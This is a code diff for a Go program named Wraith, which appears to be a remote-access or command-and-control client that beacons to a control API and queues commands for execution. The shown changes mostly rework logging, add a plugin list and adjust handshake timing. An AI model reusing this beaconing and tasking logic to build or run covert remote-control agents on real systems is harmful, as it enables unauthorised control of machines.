@@ -94,15 +94,11 @@ func req(ReqType string, URL string, VerifySSL bool, DataType string, Data strin
 
 	// Handle any errors
 	if err != nil {
-		errMsg := "http request failed with error \"" + err.Error() + "\""
-		dlog(0, "`"+ReqType+"` request (ID `"+fmt.Sprint(globalRequestCounter)+"`) to `"+URL+"` failed due to error `"+errMsg+"`")
-		return "", errors.New(errMsg)
+		return "", errors.New("http request failed with error \"" + err.Error() + "\"")
 	} else if resp.StatusCode != 200 {
 		// Close the response body when the function returns
 		defer resp.Body.Close()
-		errMsg := "non-200 http response code (" + fmt.Sprint(resp.StatusCode) + ")"
-		dlog(0, "`"+ReqType+"` request (ID `"+fmt.Sprint(globalRequestCounter)+"`) to `"+URL+"` failed due to error `"+errMsg+"`")
-		return "", errors.New(errMsg)
+		return "", errors.New("non-200 http response code (" + fmt.Sprint(resp.StatusCode) + ")")
 	} else {
 		// Close the response body when the function returns
 		defer resp.Body.Close()
@@ -110,13 +106,10 @@ func req(ReqType string, URL string, VerifySSL bool, DataType string, Data strin
 		RawBody, err := ioutil.ReadAll(resp.Body)
 		// Handle errors in reading the body
 		if err != nil {
-			errMsg := "error while reading the response body"
-			dlog(0, "`"+ReqType+"` request (ID `"+fmt.Sprint(globalRequestCounter)+"`) to `"+URL+"` failed due to error `"+errMsg+"`")
-			return "", errors.New(errMsg)
+			return "", errors.New("error while reading the response body")
 		}
 		// Trim the response body to prevent errors
 		body := strings.Trim(string(RawBody), " \n\v\t")
-		dlog(0, "`"+ReqType+"` request (ID `"+fmt.Sprint(globalRequestCounter)+"`) to `"+URL+"` got response `"+body+"`")
 		// Return the response body and no errors
 		return body, nil
 	}
@@ -134,7 +127,7 @@ type wraithStruct struct {
 	HeartbeatDelay           uint64     // The delay between each successful heartbeat
 	HandshakeReattemptDelay  uint64     // The delay between handshake reattempts if the failed heartbeat tolerance is exceeded
 	FailedHeartbeatTolerance uint64     // How many failed handshakes in a row until the connection is reset
-	HTTPRequestTimeout       uint64     // The timeout of each individual HTTP request
+	Plugins                  []string   // List of all plugins included with this Wraith
 	CommandQueue             []string   // A slice of the commands to be executed
 	CommandQueueMutex        sync.Mutex // A mutex preventing CommandQueue from being modified by multiple goroutines at the same time
 }
@@ -262,6 +255,9 @@ func (wraith *wraithStruct) Decrypt(ciphertext string) (string, error) {
 
 func (wraith *wraithStruct) API(RequestData map[string]string) (APIResponse map[string]string, APIErr error) {
 
+	// Log the API request
+	dlog(0, "request to API with contents `"+fmt.Sprint(RequestData)+"`")
+
 	// As JSON decode can cause a panic (if the read data does not match the
 	// data type map[string]string but is valid JSON) and en/decrypt probably
 	// can too, defer a function to handle the panic
@@ -318,7 +314,7 @@ func (wraith *wraithStruct) API(RequestData map[string]string) (APIResponse map[
 	// Try decrypting the API response. If this fails, assume the response is plaintext
 	responseDecrypted, errDcrypt := wraith.Decrypt(response)
 
-	// Define final response variable
+	// Define variable to hold the processed response
 	var finalResponse map[string]string
 	// Check for decryption failure
 	switch errDcrypt {
@@ -337,9 +333,11 @@ func (wraith *wraithStruct) API(RequestData map[string]string) (APIResponse map[
 		errDecode := json.Unmarshal([]byte(response), &finalResponse)
 		// If this produces an error, the response was not valid so return an error
 		if errDecode != nil {
-			return nil, errors.New("not valid API response - incorrectly encoded")
+			return nil, errors.New("not valid API response - incorrectly encrypted/encoded")
 		}
 	}
+
+	dlog(0, "response from API with contents `"+fmt.Sprint(finalResponse)+"`")
 
 	// Verify that the API fingerprint is present and trusted
 	if APIFingerprint, ok := finalResponse["api_fingerprint"]; ok {
@@ -436,6 +434,9 @@ func main() {
 	// Seed the random number generator with the current time plus the start time
 	mrand.Seed(time.Now().UTC().UnixNano() + WraithStartTime.UTC().UnixNano())
 
+	// Log imported plugins
+	dlog(0, "using plugins `"+fmt.Sprint(setPLUGINS)+"`")
+
 	// Create an instace of Wraith
 	wraith := wraithStruct{}
 	// Set the Wraith properties to their defaults
@@ -449,7 +450,7 @@ func main() {
 	wraith.HeartbeatDelay = setDEFAULTHEARTBEATDELAYBASE
 	wraith.HandshakeReattemptDelay = setDEFAULTHANDSHAKEREATTEMPTDELAY
 	wraith.FailedHeartbeatTolerance = setFAILEDHEARTBEATTOLERANCE
-	wraith.HTTPRequestTimeout = setDEFAULTHTTPREQUESTTIMEOUT
+	wraith.Plugins = setPLUGINS
 	wraith.CommandQueue = []string{}
 	wraith.CommandQueueMutex = sync.Mutex{}
 
@@ -484,7 +485,7 @@ func main() {
 			// Increment the counter
 			FailedHeartbeatCounter++
 
-			dlog(3, "heartbeat with api at `"+wraith.ControlAPIURL+"` failed and the failed heartbeat tolerance was exceeded so retrying handshake")
+			dlog(3, "sending heartbeat to api at `"+wraith.ControlAPIURL+"` failed and the failed heartbeat tolerance was exceeded so retrying handshake")
 
 			// If the counter exceeds the failed heartbeat tolerance
 			if FailedHeartbeatCounter > wraith.FailedHeartbeatTolerance {
@@ -514,7 +515,7 @@ func main() {
 				}
 
 				// The handshake succeeded so log it and wait for heartbeat
-				nextHandshakeDelay := wraith.HandshakeReattemptDelay + uint64(mrand.Intn(3))
+				nextHandshakeDelay := wraith.HeartbeatDelay + uint64(mrand.Intn(3))
 				dlog(0, "handshake succeeded so sending heartbeat in `"+fmt.Sprint(nextHandshakeDelay)+"` seconds")
 				time.Sleep(time.Duration(nextHandshakeDelay) * time.Second)
 
